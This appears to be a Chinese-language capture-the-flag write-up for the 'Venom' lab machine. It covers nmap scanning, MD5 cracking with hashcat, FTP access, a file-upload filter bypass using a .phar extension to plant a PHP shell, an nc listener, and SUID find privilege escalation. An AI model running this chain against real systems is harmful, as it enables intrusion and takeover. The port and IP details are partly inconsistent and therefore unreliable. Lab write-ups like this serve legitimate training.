---
title: Venom Writeup
date: 2025-05-24T17:29:33+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
---
# 服务扫描

## 使用 nmap 进行基础扫描

扫描所执行的命令，执行结果如下

```
sudo nmap -sn 10.10.10.0/24

sudo nmap --min-rate 10000 -p- 10.10.10.31   

sudo nmap -sC -sT -sV -p22,80 10.10.10.31 

sudo nmap --script=vuln -p22,80 10.10.10.31 
```

![P1](P1.png)

21 端口开放了 ftp 服务，在找到账号密码后可进行 登入 ，
靶机还开放了 smb 服务，可进行更详细的 smb 扫描，

查看 80 端口，是 Ubuntu 的默认界面

![P2](P2.png)

查看源代码发现串 md5

![P3](P3.png)

![P4](P4.png)

使用 hashcat 破解

```
sudo hashcat -m 0 -a 0 Hash/md5.txt /usr/share/wordlists/rockyou.txt
```

![P9](P9.png)

![P10](P10.png)

使用该字符串尝试进行 ftp 登入，因为没有密码，使用账号密码都使用 hostinger

```
ftp 10.10.10.6
```

![P11](P11.png)

binary 进入 二进制 模式

```
binary
```

获取文件

```
ls -liah

cd files

get hint.txt

exit
```

![P12](P12.png)

查看下载下来的 txt 文件

![P14](P14.png)

你需要跟随 'hostinger' 两个 base64 编码解密如下

![P15](P15.png)

![P16](P16.png)

进入给定的链接，将参数给上

![P19](P19.png)

根据提示访问 venom.box

![P18](P18.png)

登入 dora

![P20](P20.png)

点击齿轮，进入后台

![P21](P21.png)

找到文件上传页面，上传一个 php 漏洞

![P22](P22.png)

php 被过滤了，尝试不常见的 php 后缀，发现 phar 没被过滤

# Linux 提权

kali 建立 监听

```
sudo nc -lvnp 4444
```

![P23](P23.png)
![content/posts/Venom Writeup/P24](content/posts/Venom Writeup/P24.png)

查看 passwd ，寻找 拥有 bash 环境 的用户

![P25](P25.png)

切换成 hostinger 用户

```
su hostinger
```

在 /var/www/html/subrion/backup 下发现了一个密码

![P26](P26.png)

尝试切换为 nathan 用户

查看具有 s 位 的可执行文件

```
find / -perm -u=s -type f 2>/dev/null
```

![P27](P27.png)

使用 find 提权

```
sudo install -m =xs $(which find) .

./find . -exec /bin/bash -p \; -quit
```

![P28](P28.png)